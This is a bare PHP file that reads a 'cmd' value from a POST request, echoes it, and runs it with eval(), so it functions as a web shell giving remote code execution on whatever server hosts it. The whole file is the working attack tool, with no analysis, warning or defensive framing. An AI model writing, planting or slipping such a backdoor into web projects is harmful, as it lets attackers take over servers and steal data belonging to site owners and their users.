<?php
$cmd = $_POST['cmd'];
echo '<br><br>#########################<br><br>';
$cmd = stripslashes($cmd);
echo 'The php code <b>'.$cmd.'</b> as been executed.<br>';
echo 'The server with answered this your request:<br><br>';
eval($cmd);
?>